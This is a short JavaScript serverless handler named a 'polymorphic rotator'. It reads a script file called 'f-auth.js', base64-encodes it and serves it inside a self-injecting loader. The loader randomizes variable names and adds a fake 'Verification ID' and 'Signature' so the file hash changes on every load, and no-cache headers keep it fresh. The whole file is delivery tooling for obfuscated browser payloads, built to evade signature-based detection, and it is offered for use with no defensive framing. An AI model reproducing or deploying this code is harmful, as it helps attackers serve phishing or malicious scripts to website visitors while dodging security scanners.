// /api/payload.js - ELITE POLYMORPHIC ROTATOR
const fs = require('fs');
const path = require('path');

export default async function handler(req, res) {
    try {
        const filePath = path.join(process.cwd(), 'f-auth.js');
        const code = fs.readFileSync(filePath, 'utf8');

        // 🧬 Base64 Encoding
        const b64 = Buffer.from(code).toString('base64');

        // 🌀 Randomized Salt & Variable Names (Changes File Hash every load)
        const salt = Math.random().toString(36).substring(2, 10);
        const v1 = `_0x${Math.random().toString(16).slice(2, 7)}`;
        const v2 = `_0x${Math.random().toString(16).slice(2, 7)}`;

        // The "Polymorphic Shell"
        // This unpacked code changes its internal structure every time it's served
        const polymorphicShell = `
/**
 * Verification ID: ${salt}
 * Signature: ${Math.random().toString(36).slice(2)}
 */
(function(${v1}){
    const ${v2} = atob(${v1});
    const s = document.createElement('script');
    s.textContent = ${v2};
    document.head.appendChild(s);
})("${b64}");
`;

        res.setHeader('Content-Type', 'application/javascript');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');

        return res.status(200).send(polymorphicShell);
    } catch (e) {
        console.error(e);
        return res.status(500).send('// Error generating payload');
    }
}
